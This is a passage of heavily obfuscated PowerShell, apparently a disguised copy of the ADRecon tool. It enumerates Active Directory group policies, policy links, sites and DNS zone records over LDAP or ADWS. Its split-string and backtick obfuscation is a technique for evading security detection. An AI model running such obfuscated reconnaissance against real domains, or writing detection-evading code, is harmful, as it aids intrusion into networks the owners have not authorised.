            &("{0}{2}{1}{3}"-f 'Wr','rb','ite-Ve','ose') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`UlL}
        }
        ${O`Bjs`Ea`RCHer}.("{0}{2}{1}" -f'di','pose','s').Invoke()

        If (${ADO`Us})
        {
            &("{2}{0}{1}{3}"-f '-V','e','Write','rbose') "[*] Total OUs: $([ADRecon.LDAPClass]::ObjectCount($ADOUs)) "
            ${O`UObj} =  $d761P::("{2}{1}{0}"-f 'ser','r','OUPa').Invoke(${aDO`US}, ${t`hr`EAds})
            &("{1}{3}{2}{0}"-f'le','Remo','Variab','ve-') ("{0}{1}"-f 'A','DOUs')
        }
    }

    If (${O`UOBj})
    {
        Return ${oU`O`Bj}
    }
    Else
    {
        Return ${n`Ull}
    }
}

Function g`et-a`DRg`po
{

    param(
        [Parameter(maNDatoRy = ${t`Rue})]
        [string] ${Me`Th`oD},

        [Parameter(mandatOry = ${FA`L`se})]
        [DirectoryServices.DirectoryEntry] ${o`BjdOM`Ain},

        [Parameter(MANDatoRY = ${t`RUe})]
        [int] ${pAGESi`ze},

        [Parameter(MAnDaTORY = ${f`Alse})]
        [int] ${tH`REaDs} = 10
    )

    If (${mET`h`oD} -eq ("{0}{1}" -f'AD','WS'))
    {
        Try
        {
            ${a`DG`pOs} = @( &("{2}{1}{3}{0}"-f'ject','t-','Ge','ADOb') -LDAPFilter (("{7}{9}{4}{0}{1}{5}{6}{10}{2}{8}{3}"-f'r','o','yC','r)','=g','upP','o','(objectCategor','ontaine','y','lic')) -Properties ("{0}{1}{2}" -f 'Disp','layNam','e'),("{5}{4}{1}{3}{2}{0}" -f 'Name','sh','d','e','gui','Distin'),("{1}{0}" -f'ame','N'),("{0}{3}{4}{2}{1}"-f 'g','Path','ys','P','CFileS'),("{0}{2}{1}" -f'w','reated','henC'),("{1}{2}{3}{0}" -f 'anged','wh','enC','h') )
        }
        Catch
        {
            &("{2}{0}{1}{3}" -f 'rite-','War','W','ning') ("{12}{1}{0}{8}{11}{3}{5}{10}{9}{4}{2}{7}{6}"-f 'or while enumerating group','PO] Err','e','Co','ner Obj','n','s','ct','Poli','ai','t','cy','[Get-ADRG')
            &("{2}{3}{4}{0}{1}"-f 'r','bose','Writ','e-V','e') "[EXCEPTION] $($_.Exception.Message) "
            Return ${n`UlL}
        }

        If (${A`dGpoS})
        {
            &("{1}{0}{3}{2}"-f'-Ve','Write','ose','rb') "[*] Total GPOs: $([ADRecon.ADWSClass]::ObjectCount($ADGPOs)) "
            ${GpOs`Obj} =   $It3V9E::("{1}{0}{2}"-f 'a','GPOP','rser').Invoke(${adG`P`os}, ${Th`RE`Ads})
            &("{1}{0}{3}{2}" -f'mov','Re','Variable','e-') ("{0}{1}"-f'ADGPO','s')
        }
    }

    If (${me`Th`oD} -eq ("{1}{0}" -f'DAP','L'))
    {
        ${o`BJs`ear`chEr} = &("{0}{2}{1}"-f 'New-Obj','t','ec') ("{6}{4}{1}{5}{2}{3}{0}"-f'her','te','.Director','ySearc','s','m.DirectoryServices','Sy') ${oBJ`doM`A`In}
        ${OBj`SEAr`Cher}."p`A`GEsizE" = ${PA`g`es`IZE}
        ${OBJ`se`AR`cHER}."FiLT`eR" = (("{2}{8}{3}{1}{4}{6}{9}{5}{7}{0}"-f'tainer)','tCateg','(','ec','o','oupPolicy','ry=g','Con','obj','r'))
        ${oB`jseAr`chER}."sEA`R`ch`SCope" = ("{0}{1}"-f 'Subtre','e')

        Try
        {
            ${a`DgPOS} = ${o`BjsEA`R`chER}.("{1}{2}{0}"-f'All','Fin','d').Invoke()
        }
        Catch
        {
            &("{1}{3}{2}{0}" -f'ing','Writ','rn','e-Wa') ("{12}{11}{17}{0}{9}{1}{4}{2}{8}{15}{3}{6}{5}{10}{14}{13}{18}{7}{16}"-f'ADRG','O] Error w','e e','ating ','hil','roupP','g','t','n','P','olic','et','[G','er Obje','yContain','umer','s','-','c')
            &("{2}{0}{1}{3}"-f'r','ite-Verbo','W','se') "[EXCEPTION] $($_.Exception.Message) "
            Return ${Nu`lL}
        }
        ${objSe`Arch`er}.("{1}{2}{0}" -f 'se','disp','o').Invoke()

        If (${a`d`gPOs})
        {
            &("{1}{3}{0}{2}" -f 'rbos','Wri','e','te-Ve') "[*] Total GPOs: $([ADRecon.LDAPClass]::ObjectCount($ADGPOs)) "
            ${Gp`osO`BJ} =   (GI  varIabLe:d761P).VaLue::("{2}{0}{1}"-f 'Par','ser','GPO').Invoke(${aD`g`POs}, ${th`ReA`Ds})
            &("{2}{1}{3}{4}{0}"-f'e','-V','Remove','aria','bl') ("{1}{0}{2}"-f 'G','AD','POs')
        }
    }

    If (${gpo`SO`BJ})
    {
        Return ${gP`osO`Bj}
    }
    Else
    {
        Return ${N`Ull}
    }
}


Function G`eT-`ADRgPl`INk
{

    param(
        [Parameter(mANDaTorY = ${tr`UE})]
        [string] ${m`ethOD},

        [Parameter(MaNdaTorY = ${FAL`Se})]
        [DirectoryServices.DirectoryEntry] ${o`BJ`dOMaIn},

        [Parameter(mAndaToRY = ${t`RUE})]
        [int] ${p`A`gesIzE},

        [Parameter(MAnDatoRY = ${fA`L`SE})]
        [int] ${tHr`Ea`dS} = 10
    )

    If (${M`EThOd} -eq ("{1}{0}"-f 'S','ADW'))
    {
        Try
        {
            ${A`dsOMs} = @( &("{1}{0}{2}"-f'Obje','Get-AD','ct') -LDAPFilter ((("{4}{8}{10}{1}{5}{0}{7}{15}{3}{11}{14}{12}{9}{6}{2}{16}{13}"-f 'a','c','alU','n','(Dnk(','tcl','n','ss=doma','ob','zatio','je',')(ob','class=organi','it))','ject','i','n'))-cRePlACe'Dnk',[CHAR]124) -Properties ("{2}{3}{1}{0}" -f 'ame','edN','D','istinguish'),("{1}{0}"-f 'ame','N'),("{0}{1}" -f 'gPL','ink'),("{0}{2}{1}" -f'gPO','ions','pt') )
            ${A`DsoMs} += @( &("{2}{0}{1}"-f 't-ADObje','ct','Ge') -SearchBase "CN=Sites,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter ("{1}{0}{4}{2}{3}"-f 's=','(objectclas','ite',')','s') -Properties ("{1}{2}{3}{0}" -f 'dName','D','istinguis','he'),("{1}{0}"-f 'ame','N'),("{0}{1}"-f'gPLin','k'),("{0}{1}{2}" -f'gPOpti','o','ns') )
        }
        Catch
        {
            &("{2}{3}{1}{0}" -f'ing','e-Warn','Wri','t') ("{6}{0}{9}{11}{5}{8}{2}{10}{1}{3}{7}{4}" -f'-ADRGPLink] Error','M Obj','S','e','ts','enumerati','[Get','c','ng ',' while','O',' ')
            &("{2}{0}{3}{1}" -f 'Ve','se','Write-','rbo') "[EXCEPTION] $($_.Exception.Message) "
            Return ${NU`LL}
        }

        Try
        {
            ${aDg`pos} = @( &("{1}{0}{2}{3}"-f'b','Get-ADO','je','ct') -LDAPFilter (("{6}{8}{2}{4}{5}{1}{10}{7}{9}{0}{3}" -f 'ntainer','grou','eg',')','or','y=','(objectC','i','at','cyCo','pPol')) -Properties ("{2}{0}{1}" -f 'is','playName','D'),("{2}{1}{3}{0}"-f'uishedName','n','Disti','g') )
        }
        Catch
        {
            &("{2}{3}{0}{1}" -f 'Wa','rning','Wri','te-') ("{1}{6}{5}{8}{4}{11}{0}{10}{3}{7}{12}{2}{9}" -f 'ng group','[Get-','b','c','at','GPLink] ','ADR','yContai','Error while enumer','jects','Poli','i','ner O')
            &("{2}{0}{1}" -f 'o','se','Write-Verb') "[EXCEPTION] $($_.Exception.Message) "
            Return ${n`Ull}
        }

        If ( (${a`Ds`oms}) -and (${AD`gp`OS}) )
        {
            &("{3}{2}{1}{0}"-f'e','rbos','e','Write-V') "[*] Total SOMs: $([ADRecon.ADWSClass]::ObjectCount($ADSOMs)) "
            ${so`mO`BJ} =   (  VARiabLE ("i"+"t"+"3v9E") -valUeOnL)::("{1}{0}" -f'MParser','SO').Invoke(${aDgP`os}, ${A`D`SOMs}, ${tHREa`dS})
            &("{1}{0}{2}"-f'move','Re','-Variable') ("{0}{1}{2}"-f 'ADSO','M','s')
            &("{1}{3}{0}{2}" -f'-Variabl','Remov','e','e') ("{0}{1}"-f'AD','GPOs')
        }
    }

    If (${meTH`Od} -eq ("{1}{0}" -f'P','LDA'))
    {
        ${A`d`SOmS} = @()
        ${OB`J`SEAR`cheR} = &("{2}{1}{0}"-f 't','ew-Objec','N') ("{4}{0}{3}{7}{2}{1}{6}{5}"-f 'e','to','ces.Direc','m.','Syst','cher','rySear','DirectoryServi') ${obJDOM`A`in}
        ${oB`J`SEaRch`er}."PAGE`SIze" = ${PaGES`IzE}
        ${o`BjsEarch`er}."f`Il`Ter" = ((("{7}{4}{0}{2}{8}{9}{1}{6}{3}{5}"-f '(','ctc','object','ti','dyb','onalUnit))','lass=organiza','(','class=domain)(ob','je'))."rEP`LAce"(([ChaR]100+[ChaR]121+[ChaR]98),[StRIng][ChaR]124))
        ${OBJs`ea`RchEr}."p`RoPer`TieSt`OLOad".("{1}{0}{2}" -f 'd','Ad','Range').Invoke((("{0}{4}{1}{5}{3}{2}" -f 'dist','ishedn','e','m','ingu','a'),("{1}{0}" -f'me','na'),("{1}{0}"-f 'nk','gpli'),("{0}{2}{1}"-f'g','ns','poptio')))
        ${ObjSea`RC`h`ER}."sEaRcH`sc`O`pe" = ("{0}{1}" -f'Subt','ree')

        Try
        {
            ${AD`s`oms} += ${OBjs`eARC`HeR}.("{0}{1}"-f'FindA','ll').Invoke()
        }
        Catch
        {
            &("{0}{4}{2}{1}{3}" -f'Wri','rn','e-Wa','ing','t') ("{2}{0}{4}{5}{1}{3}{7}{8}{6}" -f 'et','ror while enumerating SOM','[G',' ','-ADRGPLink] E','r','s','Ob','ject')
            &("{1}{0}{2}{3}" -f'e','Writ','-','Verbose') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`ULl}
        }
        ${oBjseAr`C`heR}.("{1}{0}{2}" -f's','dispo','e').Invoke()

        ${SeAr`ChPA`Th} = ("{0}{1}"-f'C','N=Sites')
        If (${CR`eD`entI`AL} -ne  $NK5P::"emP`TY")
        {
            ${oB`JsEARC`H`PAth} = &("{2}{1}{0}" -f 'w-Object','e','N') ("{9}{2}{11}{7}{8}{6}{0}{3}{5}{4}{1}{10}" -f 'v','n','t','ices.','ctoryE','Dire','er','ory','S','Sys','try','em.Direct') "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)", ${C`Red`EntIAL}."U`s`ernAMe",${Cr`eD`ENT`Ial}.("{0}{2}{1}{3}" -f 'GetNetwor','edenti','kCr','al').Invoke()."pA`SsW`orD"
        }
        Else
        {
            ${OBJ`S`eAr`chp`ATH} = &("{1}{0}{2}" -f'ew-O','N','bject') ("{7}{6}{1}{8}{4}{2}{3}{9}{0}{5}" -f'nt','irec','ces.','D','ervi','ry','.D','System','toryS','irectoryE') "LDAP://$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)"
        }
        ${o`BJS`EaR`cHER} = &("{1}{0}{2}"-f '-Objec','New','t') ("{3}{5}{4}{2}{8}{7}{1}{6}{0}" -f 'cher','r','.','Sys','es','tem.DirectoryServic','ySear','cto','Dire') ${o`BjSEa`RcHPaTh}
        ${ObJSEAr`Ch`ER}."FIl`T`ER" = (("{1}{3}{2}{0}" -f 'ite)','(objec','s=s','tclas'))
        ${OBJ`sE`A`RcHEr}."prOpE`RtI`EsTol`O`AD".("{2}{1}{0}"-f'ange','ddR','A').Invoke((("{0}{1}{3}{2}"-f 'dist','inguished','e','nam'),("{0}{1}" -f 'na','me'),("{2}{0}{1}" -f 'pl','ink','g'),("{1}{2}{0}" -f'ons','g','popti')))
        ${oBJse`Ar`C`Her}."seARC`hs`C`oPe" = ("{0}{1}"-f'Sub','tree')

        Try
        {
            ${a`D`SOmS} += ${O`B`js`eARChER}.("{2}{1}{0}" -f'll','A','Find').Invoke()
        }
        Catch
        {
            &("{2}{3}{0}{1}"-f 'in','g','W','rite-Warn') ("{10}{5}{7}{6}{11}{1}{0}{4}{9}{3}{2}{8}" -f 'mer','e enu','c','e','atin','et',' whi','-ADRGPLink] Error','ts','g SOM Obj','[G','l')
            &("{2}{0}{3}{1}" -f'e','se','Write-V','rbo') "[EXCEPTION] $($_.Exception.Message) "
            Return ${n`ULl}
        }
        ${oBj`se`ARcHER}.("{0}{1}{2}" -f'd','ispos','e').Invoke()

        ${ObJ`s`e`ArchEr} = &("{1}{2}{0}"-f '-Object','N','ew') ("{4}{11}{5}{0}{10}{2}{8}{6}{7}{1}{3}{9}" -f'ctoryS','h','v','e','System.D','e','.','DirectorySearc','ices','r','er','ir') ${O`BJ`DoMain}
        ${oBjs`EA`RCHer}."PA`GESI`ZE" = ${P`AGEsi`Ze}
        ${ObJ`SE`A`RCHER}."FIlt`eR" = ("{2}{1}{6}{9}{8}{4}{5}{7}{0}{3}{10}" -f 'icyCont','objectCa','(','ain','u','pP','t','ol','y=gro','egor','er)')
        ${OBj`sEar`Ch`Er}."S`earcHs`c`Ope" = ("{0}{1}{2}" -f 'S','u','btree')

        Try
        {
            ${a`dgpOS} = ${ob`JsE`ArCher}.("{2}{0}{1}" -f 'nd','All','Fi').Invoke()
        }
        Catch
        {
            &("{0}{1}{2}" -f'Wri','te-W','arning') ("{14}{8}{16}{12}{4}{6}{10}{17}{18}{7}{3}{19}{5}{15}{11}{2}{9}{13}{0}{1}" -f'c','ts','ic','mer',' ','ing','wh','nu','et-','yContai','i','Pol','DRGPLink] Error','ner Obje','[G',' group','A','le',' e','at')
            &("{0}{1}{3}{2}" -f 'Wr','ite-Ve','bose','r') "[EXCEPTION] $($_.Exception.Message) "
            Return ${n`ULL}
        }
        ${o`BJs`E`ArChEr}.("{1}{0}" -f 'spose','di').Invoke()

        If ( (${a`DsOMS}) -and (${adg`Pos}) )
        {
            &("{0}{2}{1}"-f'Wr','te-Verbose','i') "[*] Total SOMs: $([ADRecon.LDAPClass]::ObjectCount($ADSOMs)) "
            ${s`OM`obj} =   (  GcI vArIAble:D761p  ).VAluE::("{2}{3}{1}{0}"-f 'er','MPars','S','O').Invoke(${A`DGpos}, ${aD`SOms}, ${tH`Re`ADS})
            &("{2}{1}{3}{0}" -f'ariable','-','Remove','V') ("{1}{0}"-f'SOMs','AD')
            &("{3}{1}{4}{2}{0}" -f'ble','mo','e-Varia','Re','v') ("{2}{1}{0}"-f 'Os','P','ADG')
        }
    }

    If (${S`Omo`Bj})
    {
        Return ${Som`o`Bj}
    }
    Else
    {
        Return ${nU`lL}
    }
}


Function C`OnvERt`-d`NSRecORD
{


    [OutputType({"{9}{6}{3}{0}{11}{4}{7}{8}{5}{10}{12}{2}{1}" -f 'Man','tomObject','Cus','em.','geme','n.','st','nt.Autom','atio','Sy','P','a','S'})]
    [CmdletBinding()]
    Param(
        [Parameter(PosItiON = 0, mAnDATOry = ${tR`Ue}, VAlUeFrOMpiPEliNEbYPropertYNAme = ${TR`Ue})]
        [Byte[]]
        ${DNS`ReC`OrD}
    )

    BEGIN {
        Function GEt`-`NAMe
        {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{3}{4}{1}"-f 'SU','rrectly','P','se','OutputTypeCo'}, '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                ${R`Aw}
            )

            [Int]${L`e`NgtH} = ${R`AW}[0]
            [Int]${SE`gm`ENTS} = ${r`Aw}[1]
            [Int]${IND`EX} =  2
            [String]${N`AMe}  = ''

            while (${SEg`Me`NTs}-- -gt 0)
            {
                [Int]${se`g`m`EnTLEnGtH} = ${R`Aw}[${i`Ndex}++]
                while (${SEgmENt`lENg`Th}-- -gt 0)
                {
                    ${na`ME} += [Char]${r`AW}[${iNd`ex}++]
                }
                ${nA`Me} += "."
            }
            ${N`AMe}
        }
    }

    PROCESS
    {
        
        ${Rd`Atat`ypE} =  ( GET-VARiablE xM0gk -vAl)::("{0}{2}{1}"-f 'T','16','oUInt').Invoke(${dNs`R`ECORd}, 2)
        ${u`Pd`A`TEdatsErIAl} =   (  GEt-vaRiABlE XM0gK  -VAl)::("{1}{0}{2}" -f'oU','T','Int32').Invoke(${d`NSREC`Ord}, 8)

        ${t`T`LRaW} = ${DN`SRE`cORd}[12..15]

        
        ${Nu`ll} =  ( GI ("V"+"AriaB"+"le:Y7co"+"4")).VaLuE::("{0}{2}{1}"-f 'Rever','e','s').Invoke(${T`Tl`RaW})
        ${T`TL} =   (lS  varIable:Xm0Gk  ).VaLUE::("{1}{0}"-f'Int32','ToU').Invoke(${tt`l`RAw}, 0)

        ${a`Ge} =   ( ITem  vaRIabLe:XM0gk).value::("{0}{1}{2}" -f'ToU','Int','32').Invoke(${DN`sRECo`RD}, 20)
        If (${A`gE} -ne 0)
        {
            ${TI`meS`TamP} = ((&("{1}{0}" -f'et-Date','G') -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).("{0}{1}{2}"-f 'Add','Ho','urs').Invoke(${A`ge})).("{1}{0}"-f'oString','T').Invoke()
        }
        Else
        {
            ${timE`STa`MP} = ("{2}{0}{1}" -f 'tat','ic]','[s')
        }

        ${DNsr`Ec`o`RDo`Bje`cT} = &("{0}{1}{2}{3}"-f'New','-Ob','j','ect') ("{1}{0}{2}" -f 'O','PS','bject')

        switch (${RDat`AT`YPe})
        {
            1
            {
                ${i`P} = "{0}.{1}.{2}.{3}" -f ${d`N`sREc`ORD}[24], ${D`NS`REcorD}[25], ${D`N`SrE`COrd}[26], ${d`NsRec`OrD}[27]
                ${D`Ata} = ${I`p}
                ${DnSREC`o`RDOB`J`eCT} | &("{3}{2}{1}{0}" -f 'er','-Memb','d','Ad') ("{2}{1}{3}{0}" -f'y','r','Noteprope','t') ("{1}{0}{2}" -f 'c','Re','ordType') 'A'
            }

            2
            {
                ${n`Sna`Me} = &("{2}{1}{0}" -f 't-Name','e','G') ${D`NS`REcORd}[24..${dN`SRe`coRD}."L`E`NgTh"]
                ${DA`TA} = ${nsna`mE}
                ${D`N`SrecOrdObj`E`Ct} | &("{0}{1}{2}"-f'Ad','d-Me','mber') ("{1}{3}{0}{2}"-f 'op','Note','erty','pr') ("{0}{1}{2}" -f 'R','ecordT','ype') 'NS'
            }

            5
            {
                ${a`LiAS} = &("{1}{0}{2}" -f 'Na','Get-','me') ${DNSre`cO`Rd}[24..${Dn`s`RecorD}."LeNg`TH"]
                ${dA`TA} = ${AL`I`As}
                ${dNsR`ecord`oBje`cT} | &("{3}{0}{2}{1}"-f'-','ember','M','Add') ("{3}{2}{0}{1}" -f'proper','ty','e','Not') ("{1}{2}{0}" -f 'e','Record','Typ') ("{0}{1}" -f 'CNA','ME')
            }

            6
            {
                ${P`RimAR`y`Ns} = &("{1}{2}{0}"-f 'e','Ge','t-Nam') ${Dn`s`RecORD}[44..${DN`S`R`ecord}."LENG`TH"]
                ${rE`sP`OnsIBL`eparTy} = &("{1}{0}"-f 'et-Name','G') ${DNSR`EC`ORD}[$(46+${dns`RE`CoRD}[44])..${dnSR`Ec`oRd}."L`ENGTh"]
                ${SeRiA`l`R`AW} = ${DNsR`e`COrD}[24..27]
                
                ${n`ULL} =   ( GEt-VaRiaBle  y7CO4  ).vAlUE::("{0}{2}{1}"-f'Reve','e','rs').Invoke(${S`EriAl`RaW})
                ${se`RIAl} =   $xm0Gk::("{1}{2}{0}"-f 'UInt32','T','o').Invoke(${seR`IAl`RAW}, 0)

                ${r`E`FreshR`AW} = ${dN`s`Record}[28..31]
                ${N`UlL} =  (iTEm ("VA"+"rIa"+"BL"+"E:y"+"7co4")  ).VaLUe::("{0}{1}"-f 'Re','verse').Invoke(${rE`FRE`SHraW})
                ${refR`esh} =   $Xm0Gk::("{0}{1}"-f 'ToUInt','32').Invoke(${rEFres`Hr`Aw}, 0)

                ${reT`RYR`AW} = ${D`NS`ReCO`RD}[32..35]
                ${n`Ull} =  (  geT-VArIAblE  ("y7C"+"O4") -VAlue )::("{0}{1}" -f 'Revers','e').Invoke(${R`e`TRYRaW})
                ${re`T`Ry} =   $Xm0gk::("{0}{1}" -f'ToUInt3','2').Invoke(${rET`Ry`RaW}, 0)

                ${EXP`ireSr`Aw} = ${dN`sRec`OrD}[36..39]
                ${n`UlL} =   (  DIR ('vAr'+'i'+'ABLe:'+'y7Co4') ).valuE::("{1}{0}" -f'verse','Re').Invoke(${eX`P`Ire`sRaw})
                ${E`xpI`RES} =  $XM0gK::("{0}{1}{2}"-f'ToUI','nt','32').Invoke(${eXpIReS`R`Aw}, 0)

                ${MIn`Ttl`RAW} = ${dnSRec`o`RD}[40..43]
                ${Nu`Ll} =   $y7Co4::("{0}{1}"-f'Revers','e').Invoke(${mINtT`l`RAw})
                ${Min`Ttl} =   (GET-VARiABLe XM0GK).vaLUE::("{0}{2}{1}" -f 'To','2','UInt3').Invoke(${MI`NTtl`RAw}, 0)

                ${D`AtA} = "[" + ${sERI`AL} + "][" + ${PRi`mArY`NS} + "][" + ${R`e`Sponsi`BL`ePaR`TY} + "][" + ${reF`ResH} + "][" + ${RE`T`RY} + "][" + ${e`XP`IRes} + "][" + ${mi`NtTl} + "]"
                ${dnS`R`ecOrdObj`ECt} | &("{3}{2}{1}{0}" -f'mber','-Me','d','Ad') ("{3}{1}{2}{0}" -f 'perty','otep','ro','N') ("{1}{0}{2}"-f'Typ','Record','e') 'SOA'
            }

            12
            {
                ${p`TR} = &("{0}{1}{2}"-f 'Get','-Na','me') ${d`NSrE`corD}[24..${dn`srECO`Rd}."L`E`NgtH"]
                ${Da`Ta} = ${p`TR}
                ${DNSR`E`CorDobj`eCt} | &("{2}{0}{1}"-f 'e','r','Add-Memb') ("{1}{2}{0}" -f'ty','No','teproper') ("{3}{1}{0}{2}" -f'y','ecordT','pe','R') 'PTR'
            }

            13
            {
                [string]${CP`U`TYpE} = ""
                [string]${o`stY`PE}  = ""
                [int]${seGM`e`NtLE`NGtH} = ${dNs`RecO`RD}[24]
                ${ind`Ex} = 25
                while (${sE`GMe`NTLeN`gth}-- -gt 0)
                {
                    ${cP`UTYpE} += [char]${d`NSR`ecORd}[${in`dEx}++]
                }
                ${i`Ndex} = 24 + ${D`Ns`RecORd}[24] + 1
                [int]${S`EgMeNTL`e`N`gtH} = ${i`NDex}++
                while (${S`EgMe`NTLe`NgtH}-- -gt 0)
                {
                    ${oS`T`Ype} += [char]${DNSrEc`o`RD}[${I`NDeX}++]
                }
                ${D`ATA} = "[" + ${CPu`TY`PE} + "][" + ${OSTy`PE} + "]"
                ${DnSR`eCO`R`dOBJect} | &("{2}{1}{0}"-f 'r','dd-Membe','A') ("{1}{0}{2}" -f'ot','N','eproperty') ("{0}{1}{2}"-f'Rec','o','rdType') ("{0}{1}" -f 'H','INFO')
            }

            15
            {
                ${p`RIori`TYRAw} = ${dnS`RE`Cord}[24..25]
                
                ${Nu`ll} =  (Gci  ('VAriab'+'L'+'E:y'+'7CO'+'4') ).vALuE::("{2}{0}{1}"-f'e','rse','Rev').Invoke(${PRIo`RIT`yrAw})
                ${PRio`RI`Ty} =  ( GEt-VarIaBlE XM0Gk  -vaLueonlY )::("{1}{0}" -f'Int16','ToU').Invoke(${P`RioR`Ity`Raw}, 0)
                ${M`xHosT}   = &("{2}{1}{0}"-f 'Name','-','Get') ${Dn`srEco`RD}[26..${DnS`R`EcORD}."Le`NGTH"]
                ${Da`TA} = "[" + ${P`RiorI`Ty} + "][" + ${mXHO`ST} + "]"
                ${D`NSRE`CoRdo`BJe`Ct} | &("{0}{2}{1}"-f 'A','ember','dd-M') ("{1}{3}{2}{0}"-f'rty','No','e','teprop') ("{2}{1}{3}{0}"-f 'pe','rd','Reco','Ty') 'MX'
            }

            16
            {
                [string]${t`Xt}  = ''
                [int]${se`GM`eNTlEn`g`Th} = ${DNS`RE`COrD}[24]
                ${I`NdeX} = 25
                while (${seg`mE`NTl`ENGth}-- -gt 0)
                {
                    ${t`Xt} += [char]${Dns`RECo`RD}[${i`NDEX}++]
                }
                ${da`Ta} = ${t`Xt}
                ${Dns`RecO`Rd`O`BJEcT} | &("{2}{1}{0}"-f 'Member','-','Add') ("{2}{0}{1}"-f'rt','y','Noteprope') ("{1}{0}{2}"-f 'r','Reco','dType') 'TXT'
            }

            28
            {
        		
                ${AA`Aa} = ""
                for (${i} = 24; ${i} -lt 40; ${I}+=2)
                {
                    ${b`L`ocKRAW} = ${dnSr`e`corD}[${I}..$(${I}+1)]
                    
                    ${nU`Ll} =  $Y7cO4::("{1}{0}" -f'se','Rever').Invoke(${bL`OC`KRAw})
                    ${BLo`cK} =   (dIr VARiabLe:XM0gK).vALUE::("{0}{1}"-f 'ToUIn','t16').Invoke(${BlOcK`R`Aw}, 0)
			        ${a`AAA} += (${BLO`CK}).("{1}{0}"-f 'oString','T').Invoke('x4')
			        If (${i} -ne 38)
                    {
                        ${A`Aaa} += ':'
                    }
                }
                ${da`Ta} = ${a`AAA}
                ${Dn`SRe`CoR`D`objEct} | &("{2}{1}{0}{3}" -f 'Mem','dd-','A','ber') ("{1}{2}{0}"-f'y','Note','propert') ("{0}{2}{1}"-f 'Re','dType','cor') ("{1}{0}"-f'A','AAA')
            }

            33
            {
                ${PRI`orit`Yraw} = ${DN`srecO`RD}[24..25]
                
                ${Nu`ll} =  (  GEt-itEM  VaRiAblE:Y7cO4).VALUe::("{2}{0}{1}"-f'vers','e','Re').Invoke(${PR`IorI`TYR`AW})
                ${pr`IOr`itY} =  ( get-VARIablE xM0gK  ).VALUe::("{0}{1}"-f 'To','UInt16').Invoke(${Pr`IorITy`R`AW}, 0)

                ${w`eiG`hTraw} = ${dN`SRE`cord}[26..27]
                ${N`ULL} =  ( chiLDItem  ("vAr"+"iaBL"+"e:y"+"7Co4") ).VALue::("{0}{1}"-f'Rever','se').Invoke(${W`EIg`hTrAw})
                ${We`Ig`ht} =   $Xm0GK::("{0}{2}{1}" -f'ToU','16','Int').Invoke(${WeI`G`Htr`Aw}, 0)

                ${POrtR`AW} = ${d`NsREc`ORd}[28..29]
                ${nU`LL} =  $Y7Co4::("{1}{0}" -f'se','Rever').Invoke(${Portr`AW})
                ${P`Ort} =  (  geT-variablE ("xM0g"+"K") ).vALUe::("{0}{2}{1}"-f'To','Int16','U').Invoke(${p`OrT`RAW}, 0)

                ${s`R`VHOSt} = &("{0}{2}{1}" -f'Get-','e','Nam') ${dN`sr`ECORd}[30..${D`NSReCo`RD}."lE`N`GTh"]
                ${da`Ta} = "[" + ${Pri`O`RiTy} + "][" + ${WE`iGHt} + "][" + ${PO`RT} + "][" + ${s`R`VHOSt} + "]"
                ${d`N`SrecO`RD`O`BjECT} | &("{1}{0}{2}"-f'Membe','Add-','r') ("{2}{0}{1}{3}"-f'o','tepr','N','operty') ("{2}{0}{1}"-f'ecordT','ype','R') 'SRV'
            }

            default
            {
                ${d`ATA} = $( $f4E::"to`Base`6`4strInG"(${D`NSRe`Co`Rd}[24..${DN`s`REC`ord}."l`enGth"]))
                ${d`N`SreCORDObJe`CT} | &("{1}{0}{2}"-f 'Me','Add-','mber') ("{3}{1}{0}{2}"-f'e','oteprop','rty','N') ("{2}{0}{1}"-f'dT','ype','Recor') ("{1}{0}"-f'NKNOWN','U')
            }
        }
        ${dNSRe`c`o`RDobJE`Ct} | &("{2}{1}{3}{0}" -f'ber','e','Add-M','m') ("{0}{2}{1}{3}" -f'N','e','ot','property') ("{3}{2}{0}{4}{1}"-f 'AtS','rial','pdated','U','e') ${UP`daTe`daTSER`i`Al}
        ${dNSR`Eco`RDobjE`Ct} | &("{1}{2}{0}{3}" -f 'mbe','Add-M','e','r') ("{3}{1}{0}{2}" -f 'o','r','perty','Notep') 'TTL' ${t`TL}
        ${dNSR`eC`o`RDOBjEcT} | &("{2}{1}{0}" -f 'Member','dd-','A') ("{2}{1}{0}" -f 'operty','pr','Note') 'Age' ${a`ge}
        ${DnSR`e`CordO`Bje`CT} | &("{2}{0}{1}" -f 'mbe','r','Add-Me') ("{2}{3}{1}{0}" -f 'erty','rop','Note','p') ("{1}{2}{0}"-f'p','TimeSta','m') ${t`IME`St`Amp}
        ${DNSrEcOr`do`BJ`eCT} | &("{2}{3}{1}{0}" -f'r','be','Add','-Mem') ("{0}{1}{3}{2}"-f'N','otepr','ty','oper') ("{0}{1}"-f 'Dat','a') ${d`Ata}
        Return ${dN`sR`ECO`RdObjeCT}
    }
}

Function g`et`-adRD`NS`ZonE
{

    param(
        [Parameter(MAndatoRY = ${t`RuE})]
        [string] ${me`ThoD},

        [Parameter(MandATOry = ${f`AlSE})]
        [DirectoryServices.DirectoryEntry] ${OBjD`oM`Ain},

        [Parameter(manDAtORy = ${f`A`lsE})]
        [string] ${Doma`IN`cOntrol`L`eR},

        [Parameter(mANDATOrY = ${FAl`sE})]
        [Management.Automation.PSCredential] ${CREDE`N`TiAL} =  (  gEt-vaRIABLe  Nk5p ).VaLuE::"EM`pty",

        [Parameter(MAnDaToRY = ${T`RuE})]
        [int] ${pA`gES`I`ZE},

        [Parameter(MAndATorY = ${t`RuE})]
        [string] ${Ad`ROut`P`U`TdiR},

        [Parameter(MandAtORy = ${tR`Ue})]
        [array] ${oUTp`U`TTYPE},

        [Parameter(maNdaTory = ${f`AlSE})]
        [bool] ${a`DrdN`SZ`oNEs} = ${TR`UE},

        [Parameter(MAnDATorY = ${Fa`L`Se})]
        [bool] ${A`dRDNSr`EcOr`ds} = ${f`Alse}
    )

    If (${m`eThOd} -eq ("{1}{0}" -f'DWS','A'))
    {
        Try
        {
